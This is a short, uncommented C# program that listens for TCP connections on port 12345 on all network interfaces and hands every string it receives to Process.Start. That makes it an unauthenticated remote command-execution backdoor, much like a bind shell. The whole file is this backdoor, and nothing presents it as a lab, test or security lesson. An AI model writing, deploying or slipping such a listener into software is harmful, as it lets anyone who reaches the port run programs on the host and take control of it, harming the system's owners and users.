using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;

class Program
{
    static void Main()
    {
        TcpListener server = new TcpListener(IPAddress.Any, 12345);
        server.Start();
        Console.WriteLine("Server listening...");

        Socket client = server.AcceptSocket();
        Console.WriteLine("Client connected.");

        while (true)
        {
            byte[] buffer = new byte[1024];
            int bytesRead = client.Receive(buffer);
            if (bytesRead == 0) break;
            string command = System.Text.Encoding.ASCII.GetString(buffer, 0, bytesRead);
            Process.Start(command); 
        }
        client.Close();
    }
}